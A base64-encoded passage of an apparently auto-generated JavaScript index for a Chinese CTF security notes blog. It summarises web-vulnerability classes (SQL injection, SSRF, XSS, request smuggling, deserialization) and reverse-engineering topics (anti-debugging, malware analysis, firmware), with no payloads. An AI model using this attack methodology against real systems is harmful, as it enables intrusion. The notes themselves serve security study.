GF0YVxcXFxrYlxcXFxpbmRleC5qc1wiO2NvbnN0IF9fdml0ZV9pbmplY3RlZF9vcmlnaW5hbF9pbXBvcnRfbWV0YV91cmwgPSBcImZpbGU6Ly8vQzovVXNlcnMvaHdoL2Jsb2cvZnJvbnRlbmQvc3JjL2RhdGEva2IvaW5kZXguanNcIjtleHBvcnQgZGVmYXVsdCB7XG4gXCJnZW5lcmF0ZWRBdFwiOiBcIjIwMjYtMTAtMDVUMTE6NDI6NTAuOTMwWlwiLFxuIFwidmF1bHRcIjogXCJDOlxcXFxVc2Vyc1xcXFxod2hcXFxcRGVza3RvcFxcXFxcdTc3RTVcdThCQzZcdTVFOTNcXFxcaHNiXHU3Njg0XHU3QjJDXHU0RThDXHU1OTI3XHU4MTExXFxcXDAyLVx1N0IxNFx1OEJCMFwiLFxuIFwidG90YWxcIjogNjksXG4gXCJzZWN0aW9uc1wiOiBbXG4gIHtcbiAgIFwiaWRcIjogXCJjb25jZXB0XCIsXG4gICBcInRpdGxlXCI6IFwiXHU2OTgyXHU1RkY1XCIsXG4gICBcImdyb3Vwc1wiOiBbXG4gICAge1xuICAgICBcImlkXCI6IFwid2ViXCIsXG4gICAgIFwidGl0bGVcIjogXCJXZWJcIixcbiAgICAgXCJub3Rlc1wiOiBbXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiV2ViLVx1NTNDRFx1NUU4Rlx1NTIxN1x1NTMxNlx1NkYwRlx1NkQxRVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItXHU1M0NEXHU1RThGXHU1MjE3XHU1MzE2XHU2RjBGXHU2RDFFXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU3QTBCXHU1RThGXHU2MjhBXFxcIlx1NUI1N1x1ODI4Mlx1NkQ0MVx1OEZEOFx1NTM5Rlx1NjIxMFx1NUJGOVx1OEM2MVxcXCJcdTc2ODRcdThGQzdcdTdBMEJcdTdFRDlcdTRFODZcdTY1M0JcdTUxRkJcdTgwMDVcdTYzQTdcdTUyMzZcdTY3NDNcdTIwMTRcdTIwMTRcdTUxNzNcdTk1MkVcdTU3MjhcdTRFOEUqKlx1ODBGRFx1NEUwRFx1ODBGRFx1NjNBN1x1NTIzNlx1ODhBQlx1OEZEOFx1NTM5Rlx1NzY4NFx1N0M3Qlx1MzAwMVx1NEVFNVx1NTNDQVx1OEZEOFx1NTM5Rlx1NjVGNlx1ODFFQVx1NTJBOFx1OEMwM1x1NzUyOFx1NEU4Nlx1NEVDMFx1NEU0OFx1NjVCOVx1NkNENSoqXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiV2ViLVx1N0FERVx1NjAwMVx1Njc2MVx1NEVGNlx1NjUzQlx1NTFGQlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItXHU3QURFXHU2MDAxXHU2NzYxXHU0RUY2XHU2NTNCXHU1MUZCXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU1NDBDXHU0RTAwXHU0RUY2XHU0RThCXHU4OEFCXFxcIlx1NTQwQ1x1NjVGNlxcXCJcdTUwNUFcdTRFODZcdTRFMjRcdTZCMjFcdUZGMUEqKlx1NjhDMFx1NjdFNVx1RkYwOGNoZWNrXHVGRjA5XHU1NDhDXHU0RjdGXHU3NTI4XHVGRjA4dXNlXHVGRjA5XHU0RTRCXHU5NUY0XHU2NzA5XHU0RTAwXHU0RTJBXHU1QzBGXHU3QTk3XHU1M0UzKipcdUZGMENcdTVFNzZcdTUzRDFcdThCRjdcdTZDNDJcdTUzRUZcdTRFRTVcdTYzMjRcdThGREJcdThGRDlcdTRFMkFcdTdBOTdcdTUzRTNcdUZGMENcdThCQTlcdTYyNDBcdTY3MDlcdThCRjdcdTZDNDJcdTkwRkRcdTc2RjhcdTRGRTFcXFwiXHU4RkQ4XHU2Q0ExXHU1MDVBXHU4RkM3XFxcIlx1MzAwMkNURiBcdTkxQ0NcdTVCODNcdTRFMTNcdTZDQkJcdTc5RUZcdTUyMDZcdTMwMDFcdTRGNTlcdTk4OURcdTMwMDFcdTRGMThcdTYwRTBcdTUyMzhcdTMwMDFcdTRFMDBcdTZCMjFcdTYwMjdcdTRFRTRcdTcyNENcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJXZWItXHU1QkEyXHU2MjM3XHU3QUVGXHU2NTNCXHU1MUZCXHU0RTBFXHU1MjREXHU3QUVGXHU1Qjg5XHU1MTY4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIldlYi1cdTVCQTJcdTYyMzdcdTdBRUZcdTY1M0JcdTUxRkJcdTRFMEVcdTUyNERcdTdBRUZcdTVCODlcdTUxNjhcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTY3MERcdTUyQTFcdTdBRUZcdTYyOEFcdTMwMENcdTc1MjhcdTYyMzdcdTc2ODRcdThGOTNcdTUxNjVcdTMwMERcdTkwMDFcdTU2REVcdTZENEZcdTg5QzhcdTU2NjhcdTRFNEJcdTU0MEVcdTUzRDFcdTc1MUZcdTc2ODRcdTY1M0JcdTUxRkJcdTMwMDJcdTY4MzhcdTVGQzNcdTRFMERcdTY2MkZcdTVGMzlcdTdBOTdcdUZGMENcdTgwMENcdTY2MkYqKlx1NjcwOVx1NTZERVx1NjYzRS9cdTY1RTBcdTU2REVcdTY2M0VcdTRFMEJcdTYwMEVcdTRFNDhcdTYyOEFcdTY1NzBcdTYzNkVcdTVFMjZcdTUxRkFcdTY3NjUqKlx1RkYxQVhTUyBcdTUyMjRcdTU3OEIgXHUyMTkyIFx1N0VENVx1OEZDNyBcdTIxOTIgXHU1OTE2XHU1RTI2XHVGRjBDXHU0RUU1XHU1M0NBIENTUkZcdTMwMDFcdTcwQjlcdTUxRkJcdTUyQUJcdTYzMDFcdTMwMDFwb3N0TWVzc2FnZVx1MzAwMVx1NTM5Rlx1NTc4Qlx1OTRGRVx1NkM2MVx1NjdEM1x1MzAwMVx1NTI0RFx1N0FFRlx1Njg0Nlx1NjdCNlx1OTY3N1x1OTYzMVx1OEZEOVx1NEU5Qlx1MzAwQ1x1NEUwRFx1NUYzOSBhbGVydCBcdTRFNUZcdTgwRkRcdTYyRkZcdTY1NzBcdTYzNkVcdTMwMERcdTc2ODRcdThERUZcdTVGODRcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJXZWItXHU5MDNCXHU4RjkxXHU2RjBGXHU2RDFFXHU0RTBFXHU2NTJGXHU0RUQ4XHU1Qjg5XHU1MTY4XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIldlYiBcdTkwM0JcdThGOTFcdTZGMEZcdTZEMUVcdTRFMEVcdTY1MkZcdTRFRDhcdTVCODlcdTUxNjhcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTRFMERcdTk3NjBcdTZDRThcdTUxNjUvXHU0RTBBXHU0RjIwXHVGRjBDXHU4MDBDXHU2NjJGXFxcIlx1NEVFM1x1NzgwMVx1OTAzQlx1OEY5MVx1NTE5OVx1OTUxOVx1NEU4NlxcXCJcdTkwMjBcdTYyMTBcdTc2ODRcdThEOEFcdTY3NDNcdTMwMDFcdTdFRDVcdThGQzdcdTRFMEVcdTg1ODVcdTdGOEFcdTZCREJcdTMwMDJcdThGRDlcdTdDN0JcdTk4OTgqKlx1NkNBMVx1NjcwOVx1OTAxQVx1NzUyOCBwYXlsb2FkKipcdUZGMENcdTgwMDNcdTc2ODRcdTY2MkZcdTYyOEFcdTRFMUFcdTUyQTFcdTZENDFcdTdBMEJcdTVGNTNcdTcyQjZcdTYwMDFcdTY3M0FcdTY3NjVcdTYzQThcdTc0MDZcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJXZWItXHU1NDdEXHU0RUU0XHU2MjY3XHU4ODRDXHU0RTBFU1NUSVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItXHU1NDdEXHU0RUU0XHU2MjY3XHU4ODRDXHU0RTBFU1NUSVwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NzZFRVx1NjgwN1x1OTBGRFx1NjYyRlxcXCJcdThCQTlcdTY3MERcdTUyQTFcdTU2NjhcdTYyNjdcdTg4NENcdTYyMTFcdTRFRUNcdTYwRjNcdTYyNjdcdTg4NENcdTc2ODRcdTRFMUNcdTg5N0ZcXFwiXHUzMDAyXHU1MzNBXHU1MjJCXHU1NzI4XHU0RThFXHVGRjFBXHU1NDdEXHU0RUU0XHU2MjY3XHU4ODRDXHU2NjJGXHU3NkY0XHU2M0E1XHU1NzI4IHNoZWxsIFx1OTFDQ1x1OEREMVx1RkYwQ1NTVEkgXHU2NjJGXHU1MDFGXHU2QTIxXHU2NzdGXHU1RjE1XHU2NENFXHU3Njg0XHU2MjRCXHU4REQxXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiV2ViLVx1OEJGN1x1NkM0Mlx1OEQ3MFx1NzlDMVx1NEUwRVx1NTM0Rlx1OEJBRVx1NUM0Mlx1NjUzQlx1NTFGQlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItXHU4QkY3XHU2QzQyXHU4RDcwXHU3OUMxXHU0RTBFXHU1MzRGXHU4QkFFXHU1QzQyXHU2NTNCXHU1MUZCXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU1MjREXHU3QUVGXHVGRjA4XHU1M0NEXHU0RUUzL1x1OEQxRlx1OEY3RFx1NTc0N1x1ODg2MVx1RkYwOVx1NTQ4Q1x1NTQwRVx1N0FFRlx1RkYwOFx1NUU5NFx1NzUyOFx1NjcwRFx1NTJBMVx1NTY2OFx1RkYwOSoqXHU1QkY5XFxcIlx1NEUwMFx1NEUyQVx1OEJGN1x1NkM0Mlx1NTIzMFx1NTRFQVx1N0VEM1x1Njc1RlxcXCJcdTc0MDZcdTg5RTNcdTRFMERcdTRFMDBcdTgxRjQqKlx1NjVGNlx1RkYwQ1x1NTkxQVx1NTFGQVx1Njc2NVx1NzY4NFx1NUI1N1x1ODI4Mlx1NEYxQVx1ODhBQlx1NUY1M1x1NjIxMFxcXCJcdTRFMEJcdTRFMDBcdTRFMkFcdThCRjdcdTZDNDJcXFwiXHUyMDE0XHUyMDE0XHU4RkQ5XHU1QzMxXHU2NjJGXHU4QkY3XHU2QzQyXHU4RDcwXHU3OUMxXHUzMDAyQ1RGIFx1OTFDQ1x1NUI4M1x1NUUzOFx1NjYyRioqXHU3RUQ1XHU4RkM3XHU1MjREXHU3QUVGIEFDTFx1MzAwMVx1NzZGNFx1NjNBNVx1NjI1M1x1NTE4NVx1OTBFOFx1N0FFRlx1NzBCOSoqXHU3Njg0XHU5MEEzXHU2MjhBXHU5NEE1XHU1MzE5XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiV2ViLVx1OEJBNFx1OEJDMVx1NEUwRVx1NEYxQVx1OEJERFx1NkYwRlx1NkQxRVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItXHU4QkE0XHU4QkMxXHU0RTBFXHU0RjFBXHU4QkREXHU2RjBGXHU2RDFFXCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU1NkY0XHU3RUQ1XFxcIlx1NEY2MFx1NjYyRlx1OEMwMVx1MzAwMVx1NEY2MFx1NjAwRVx1NEU0OFx1OEJDMVx1NjYwRVxcXCJcdTc2ODRcdTkwRThcdTUyMDZcdUZGMUFcdTc2N0JcdTVGNTVcdTMwMDFDb29raWUvU2Vzc2lvblx1MzAwMVRva2VuXHVGRjA4SldUXHVGRjA5XHUzMDAxXHU4RDhBXHU2NzQzXHUzMDAyKipDVEYgXHU5MUNDXHU4RkQ5XHU5ODc1XHU3Njg0XHU3N0U1XHU4QkM2XHU3RUNGXHU1RTM4XHU2NjJGXHU2MkZGXHU1MjMwXHU3QjJDXHU0RTAwXHU4REYzXHU1MUVEXHU2MzZFXHU3Njg0XHU5NEE1XHU1MzE5XHUzMDAyKipcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJXZWItXHU2NTg3XHU0RUY2XHU1MzA1XHU1NDJCXHU0RTBFXHU0RTBBXHU0RjIwXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIldlYi1cdTY1ODdcdTRFRjZcdTUzMDVcdTU0MkJcdTRFMEVcdTRFMEFcdTRGMjBcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTRFMjRcdTUxNDRcdTVGMUZcdUZGMUEqKlx1NTMwNVx1NTQyQioqXHVGRjA4XHU2MjhBXHU2NzBEXHU1MkExXHU1NjY4XHU0RTBBXHU3Njg0XHU1MjJCXHU3Njg0XHU2NTg3XHU0RUY2XHU1RjUzXHU0RUUzXHU3ODAxL1x1NTE4NVx1NUJCOVx1OEJGQlx1OEZEQlx1Njc2NVx1RkYwOVx1NTQ4QyoqXHU0RTBBXHU0RjIwKipcdUZGMDhcdTYyOEFcdTgxRUFcdTVERjFcdTUxOTlcdTc2ODRcdTY1ODdcdTRFRjZcdTY1M0VcdTUyMzBcdTY3MERcdTUyQTFcdTU2NjhcdTRFMEFcdUZGMDlcdTMwMDJcdTUzNTVcdTc1MjhcdTVGODBcdTVGODBcdTUzRUFcdTgwRkRcdThCRkJcdTY1ODdcdTRFRjZcdUZGMENcdTdFQzRcdTU0MDhcdThENzdcdTY3NjVcdTYyNERcdTY2MkYgUkNFXHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiV2ViLVx1NkU5MFx1NzgwMVx1NkNDNFx1OTczMlx1NEUwRVx1NEZFMVx1NjA2Rlx1NjUzNlx1OTZDNlwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItXHU2RTkwXHU3ODAxXHU2Q0M0XHU5NzMyXHU0RTBFXHU0RkUxXHU2MDZGXHU2NTM2XHU5NkM2XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiKipcdTRGRTFcdTYwNkZcdTY1MzZcdTk2QzZcdTRFMERcdTY2MkZcXFwiXHU1RjAwXHU1OUNCXHU1MjREXHU5NjhGXHU0RkJGXHU4REQxXHU0RTI0XHU0RTBCXFxcIlx1RkYwQ1x1ODAwQ1x1NjYyRlx1OEQyRlx1N0E3Rlx1NTE2OFx1N0EwQlx1NzY4NFx1NTJBOFx1NEY1Q1x1MzAwMioqIFx1NTkyN1x1NTkxQVx1NjU3MFxcXCJcdTUzNjFcdTRGNEZcdTRFODZcXFwiXHU3Njg0XHU2NUY2XHU1MjNCXHVGRjBDXHU3QjU0XHU2ODQ4XHU1NzI4XHU2N0QwXHU0RTJBXHU4RkQ4XHU2Q0ExXHU3NzBCXHU3Njg0XHU1NzMwXHU2NUI5XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiV2ViLUNWRVx1NTkwRFx1NzNCMFx1NEUwRVx1NURGMlx1NzdFNVx1NkYwRlx1NkQxRVx1NTIyOVx1NzUyOFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItQ1ZFXHU1OTBEXHU3M0IwXHU0RTBFXHU1REYyXHU3N0U1XHU2RjBGXHU2RDFFXHU1MjI5XHU3NTI4XCIsXG4gICAgICAgXCJzdW1tYXJ5XCI6IFwiXHU0RTAwXHU5MDUzIFdlYiBcdTk4OThcdTZDQTFcdTdFRDlcdTZFOTBcdTc4MDFcdTMwMDFcdTRFNUZcdTZDQTFcdTdFRDlcdTY2MEVcdTY2M0VcdTkwM0JcdThGOTFcdTZGMEZcdTZEMUVcdTY1RjZcdUZGMENcdTUxNDhcdTUyMkJcdTYwMjVcdTc3NDAgZnV6elx1MzAwMioqXHU2RDQxXHU3QTBCXHU2NjJGXHVGRjFBXHU4QkM2XHU1MjJCXHU3RUM0XHU0RUY2XHVGRjA4XHU2MzA3XHU3RUI5XHVGRjA5XHUyMTkyIFx1NUI5QVx1NEY0RFx1NzI0OFx1NjcyQyBcdTIxOTIgXHU3MjQ4XHU2NzJDXHU2NjIwXHU1QzA0XHU1MjMwXHU1REYyXHU3N0U1IENWRSBcdTIxOTIgXHU1M0Q2XHU1MTZDXHU1RjAwIFBvQyBcdTIxOTIgXHU2MzA5XHU3NkVFXHU2ODA3XHU3M0FGXHU1ODgzXHU5MDAyXHU5MTREIFx1MjE5MiBcdTYyNTNcdTkwMUEqKlx1MzAwMlx1NjcyQ1x1OTg3NVx1ODlFM1x1NTFCM1x1MzAwQ1x1NjAwRVx1NEU0OFx1NzdFNVx1OTA1M1x1OEJFNVx1NjI1M1x1NTRFQVx1NEUyQSBOLWRheVx1MzAwRFx1NEUwRVx1MzAwQ1BvQyBcdTRFM0FcdTRFQzBcdTRFNDhcdTU3MjhcdTRGNjBcdTYyNEJcdTRFMEFcdThERDFcdTRFMERcdTkwMUFcdTMwMERcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJXZWItU1FMXHU2Q0U4XHU1MTY1XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIldlYi1TUUxcdTZDRThcdTUxNjVcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTYyOEFcdTc1MjhcdTYyMzdcdThGOTNcdTUxNjVcdTVGNTNcdTYyMTAgU1FMIFx1OEJFRFx1NTNFNVx1NzY4NFx1NEUwMFx1OTBFOFx1NTIwNlx1NjI2N1x1ODg0Q1x1RkYwQ1x1NEVDRVx1ODAwQ1x1OEJGQlx1NUU5M1x1MzAwMVx1N0VENVx1OEZDN1x1NzY3Qlx1NUY1NVx1MzAwMVx1NTcyOFx1OTBFOFx1NTIwNlx1NTczQVx1NjY2Rlx1NEUwQlx1NTE5OVx1NjU4N1x1NEVGNlx1NjIxNlx1NjI2N1x1ODg0Q1x1NTQ3RFx1NEVFNFx1MzAwMioqXHU1MjI0XHU2NUFEXHU5ODdBXHU1RThGXHU2QzM4XHU4RkRDXHU2NjJGXHVGRjFBXHU1MTQ4XHU2MjdFXHU1REVFXHU1RjAyXHVGRjBDXHU1MThEXHU1QjlBXHU3QzdCXHU1NzhCXHVGRjBDXHU2NzAwXHU1NDBFXHU2MjREXHU4QzA4XHU1MjI5XHU3NTI4XHUzMDAyKipcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJXZWItU1NSRlx1NEUwRVhYRVwiLFxuICAgICAgIFwidGl0bGVcIjogXCJXZWItU1NSRlx1NEUwRVhYRVwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NEUyNFx1NEUyQVxcXCJcdTUwMUZcdTY3MERcdTUyQTFcdTU2NjhcdTc2ODRcdThFQUJcdTRFRkRcdTUzQkJcdThCRjdcdTZDNDJcXFwiXHU3Njg0XHU2RjBGXHU2RDFFXHVGRjFBU1NSRiBcdThCQTlcdTY3MERcdTUyQTFcdTU2NjhcdTY2RkZcdTYyMTFcdTRFRUNcdTUzRDEgSFRUUCBcdThCRjdcdTZDNDJcdUZGMENYWEUgXHU4QkE5XHU4OUUzXHU2NzkwXHU1NjY4XHU2NkZGXHU2MjExXHU0RUVDXHU4QkZCXHU2NzJDXHU1NzMwXHU2NTg3XHU0RUY2L1x1NTNEMVx1OEJGN1x1NkM0Mlx1MzAwMlx1NTE3MVx1NTQwQ1x1NzBCOVx1NjYyRlx1MjAxNFx1MjAxNCoqXHU2MjhBXHU4MUVBXHU1REYxXHU0RjJBXHU4OEM1XHU2MjEwXFxcIlx1NTE4NVx1N0Y1MVx1NTNFRlx1NEZFMVx1Njc2NVx1NkU5MFxcXCJcdTMwMDIqKlwiXG4gICAgICB9XG4gICAgIF1cbiAgICB9LFxuICAgIHtcbiAgICAgXCJpZFwiOiBcInJldmVyc2VcIixcbiAgICAgXCJ0aXRsZVwiOiBcIlx1OTAwNlx1NTQxMVwiLFxuICAgICBcIm5vdGVzXCI6IFtcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTkwMDZcdTU0MTEtXHU1MkE4XHU2MDAxXHU4QzAzXHU4QkQ1XHU0RTBFXHU2QTIxXHU2MkRGXHU2MjY3XHU4ODRDXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1OTAwNlx1NTQxMS1cdTUyQThcdTYwMDFcdThDMDNcdThCRDVcdTRFMEVcdTZBMjFcdTYyREZcdTYyNjdcdTg4NENcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTk3NTlcdTYwMDFcdTc3MEJcdTRFMERcdTZFMDVcdUZGMDhcdTUzQ0RcdThDMDNcdThCRDUgLyBTTUMgLyBcdTgxRUFcdTY4MjFcdTlBOEMgLyBcdThGRDBcdTg4NENcdTY1RjZcdTg5RTNcdTVCQzYgLyBcdThERThcdTY3QjZcdTY3ODRcdUZGMDlcdTY1RjZcdUZGMENcdTVDMzFcXFwiXHU4QkE5XHU1QjgzXHU4REQxXHU4RDc3XHU2NzY1XHU3NzBCXFxcIlx1MzAwMlx1OEZEOVx1OTg3NVx1NjMwOSoqXFxcIlx1ODk4MVx1ODlFM1x1NTFCM1x1NEVDMFx1NEU0OFx1OTVFRVx1OTg5OCBcdTIxOTIgXHU3NTI4XHU1NEVBXHU0RTJBXHU1REU1XHU1MTc3XFxcIioqXHU3RUM0XHU3RUM3XHVGRjFBZ2RiL3B3bmRiZ1x1MzAwMWx0cmFjZS9zdHJhY2VcdTMwMDFGcmlkYVx1MzAwMUxEX1BSRUxPQURcdTMwMDFVbmljb3JuXHUzMDAxUUVNVSB1c2VyLW1vZGVcdTMwMDFhbmdyXHVGRjBDXHU2NzAwXHU1NDBFXHU2NjJGKipcdTUxODVcdTVCNTggZHVtcCBcdTc2RjRcdTYzQTVcdTYzNUUgZmxhZyoqIFx1OEZEOVx1NzlDRFx1NjUzNlx1NUMzRVx1NjcwMFx1NUZFQlx1NzY4NFx1NjI1M1x1NkNENVx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1OTAwNlx1NTQxMS1cdTU5MUFcdThCRURcdThBMDBcdTRFMEVcdTU5MUFcdTVFNzNcdTUzRjBcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU5MDA2XHU1NDExLVx1NTkxQVx1OEJFRFx1OEEwMFx1NEUwRVx1NTkxQVx1NUU3M1x1NTNGMFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1NjJGRlx1NTIzMFx1NEUwMFx1NEUyQVx1NEUwRFx1OEJBNFx1OEJDNlx1NzY4NFx1NjU4N1x1NEVGNlx1RkYwQyoqXHU3QjJDXHU0RTAwXHU0RUY2XHU0RThCXHU0RTBEXHU2NjJGXHU2MkQ2XHU4RkRCIElEQVx1RkYwQ1x1ODAwQ1x1NjYyRlx1NTIyNFxcXCJcdTVCODNcdTY2MkZcdTRFQzBcdTRFNDhcdThCRURcdThBMDBcdTMwMDFcdTRFQzBcdTRFNDhcdTVFNzNcdTUzRjBcdTdGMTZcdThCRDFcdTc2ODRcXFwiKipcdTIwMTRcdTIwMTRcdTUyMjRcdTk1MTlcdThCRURcdThBMDBcdUZGMENcdTUzQ0RcdTdGMTZcdThCRDFcdTdFRDNcdTY3OUNcdTRGMUFcdTY2MkZcdTRFMDBcdTU4MDZcdTc3MEJcdTRFMERcdTYxQzJcdTc2ODRcdThGRDBcdTg4NENcdTY1RjZcdTgwRjZcdTZDMzRcdTMwMDJcdThGRDlcdTk4NzVcdTdFRDlcdTMwMENcdTc3MEJcdTY1ODdcdTRFRjZcdTUxNDhcdTUyMjRcdThCRURcdThBMDAvXHU1RTczXHU1M0YwXHUzMDBEXHU3Njg0XHU1MjI0XHU2MzZFXHU4ODY4XHVGRjBDXHU1MThEXHU3RUQ5IEdvIC8gUnVzdCAvIC5ORVQgLyBDKysgLyBQeXRob24gLyBBbmRyb2lkIC8gV0FTTSAvIFx1NTZGQVx1NEVGNlx1NTQwNFx1ODFFQVx1NzY4NFx1N0IyNlx1NTNGN1x1NjA2Mlx1NTkwRFx1NEUwRVx1OUFBOFx1NjdCNlx1MzAwMlwiXG4gICAgICB9LFxuICAgICAge1xuICAgICAgIFwibmFtZVwiOiBcIlx1OTAwNlx1NTQxMS1cdTYwNzZcdTYxMEZcdThGNkZcdTRFRjZcdTUyMDZcdTY3OTBcIixcbiAgICAgICBcInRpdGxlXCI6IFwiXHU5MDA2XHU1NDExLVx1NjA3Nlx1NjEwRlx1OEY2Rlx1NEVGNlx1NTIwNlx1Njc5MFwiLFxuICAgICAgIFwic3VtbWFyeVwiOiBcIlx1N0VEOVx1NEUwMFx1NEUyQVx1Njc2NVx1OERFRlx1NEUwRFx1NjYwRVx1NzY4NFx1NjgzN1x1NjcyQ1x1RkYwQ1x1NTZERVx1N0I1NFx1NEUwOVx1NEUyQVx1OTVFRVx1OTg5OFx1MjAxNFx1MjAxNCoqXHU4RkQ5XHU2NjJGXHU0RUMwXHU0RTQ4XHVGRjA4XHU5NzU5XHU2MDAxXHVGRjA5XHUzMDAxXHU1RTcyXHU0RTg2XHU0RUMwXHU0RTQ4XHVGRjA4XHU1MkE4XHU2MDAxXHVGRjA5XHUzMDAxXHU2MDBFXHU0RTQ4XHU5MDFBXHU0RkUxXHVGRjA4XHU3RjUxXHU3RURDIElPQ1x1RkYwOSoqXHUzMDAyXHU4RkQ5XHU5ODc1XHU3RUQ5XHU3Njg0XHU2NjJGXHUzMDBDXHU1MTQ4XHU5Njk0XHU3OUJCXHU1NDBFXHU1MkE4XHU2MjRCXHUzMDBEXHU3Njg0XHU2NENEXHU0RjVDXHU5ODdBXHU1RThGXHUzMDAxXHU0RTAwXHU1RjIwXHUzMDBDXHU3NzBCXHU1MjMwXHU0RUMwXHU0RTQ4IFx1MjFEMiBcdTc1MjhcdTU0RUFcdTRFMkFcdTYyNEJcdTZDRDVcdTMwMERcdTc2ODRcdTUyMjRcdTYzNkVcdTg4NjhcdUZGMENcdTRFRTVcdTUzQ0FcdTk3NTlcdTYwMDEvXHU1MkE4XHU2MDAxL1x1ODEzMVx1NThGMy9cdTYzMDFcdTRFNDVcdTUzMTYvSU9DL1lBUkEgXHU3Njg0XHU1M0VGXHU4REQxXHU5QUE4XHU2N0I2XHVGRjFCQ1RGIFx1OTFDQ1x1NUI4M1x1NUJGOVx1NUU5NFx1NjgzN1x1NjcyQ1x1NTIwNlx1Njc5MFx1OTg5OFx1MzAwMVx1NTJEMlx1N0QyMlx1NjcyOFx1OUE2Q1x1OTg5OFx1MzAwMUlPQyBcdTYzRDBcdTUzRDZcdTk4OThcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJcdTkwMDZcdTU0MTEtXHU1M0NEXHU4QzAzXHU4QkQ1XHU0RTBFXHU2REY3XHU2REM2XHU1QkY5XHU2Mjk3XCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIlx1OTAwNlx1NTQxMS1cdTUzQ0RcdThDMDNcdThCRDVcdTRFMEVcdTZERjdcdTZEQzZcdTVCRjlcdTYyOTdcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTc2RUVcdTY4MDdcdTdBMEJcdTVFOEZcdTRFM0JcdTUyQThcdTY4QzBcdTZENEJcXFwiXHU0RjYwXHU2NjJGXHU0RTBEXHU2NjJGXHU1NzI4XHU4QzAzXHU2MjExXFxcIlx1RkYwOFx1OEMwM1x1OEJENVx1NTY2OCAvIFx1ODY1QVx1NjJERlx1NjczQSAvIFx1NTJBOFx1NjAwMVx1NjNEMlx1Njg2OSAvIFx1ODhBQlx1NjUzOVx1OEZDN1x1NzY4NFx1NEVFM1x1NzgwMVx1RkYwOVx1RkYwQ1x1NjhDMFx1NkQ0Qlx1NTIzMFx1NUMzMVx1OEQ3MCoqXHU1MDQ3XHU1MjA2XHU2NTJGXHU2MjE2XHU4MUVBXHU2NzQwKipcdTMwMDJcdThGRDlcdTk4NzVcdTdFRDlcdTMwMENcdTY4QzBcdTZENEJcdTYyNEJcdTZDRDUgXHUyMTkyIFx1OTk5Nlx1OTAwOVx1N0VENVx1OEZDN1x1MzAwRFx1NzY4NFx1NTIyNFx1NjM2RVx1ODg2OFx1RkYwQ1x1NTE4RFx1N0VEOSoqXHU4MTMxXHU1OEYzIC8gU01DIFx1ODFFQVx1NEZFRVx1NjUzOSAvIE9MTFZNIFx1NkRGN1x1NkRDNioqXHU0RTA5XHU3QzdCXHUzMDBDXHU5NzU5XHU2MDAxXHU3NzBCXHU0RTBEXHU2RTA1XHUzMDBEXHU3Njg0XHU4RkQ4XHU1MzlGXHU2MDFEXHU4REVGXHUzMDAyXHU3RUQ1XHU0RTBEXHU4RkM3XHU1M0NEXHU4QzAzXHU4QkQ1XHVGRjBDXHU1NDBFXHU5NzYyXHU2MjQwXHU2NzA5XHU5NzU5XHU2MDAxXHU1MjA2XHU2NzkwXHU5MEZEXHU1M0VGXHU4MEZEXHU2NjJGXHU1MDQ3XHU3Njg0XHUzMDAyXCJcbiAgICAgIH0sXG4gICAgICB7XG4gICAgICAgXCJuYW1lXCI6IFwiXHU5MDA2XHU1NDExLVx1NTZGQVx1NEVGNlx1NEUwRVx1NUQ0Q1x1NTE2NVx1NUYwRlx1NTIwNlx1Njc5MFwiLFxuICAgICAgIFwidGl0bGVcIjogXCJcdTkwMDZcdTU0MTEtXHU1NkZBXHU0RUY2XHU0RTBFXHU1RDRDXHU1MTY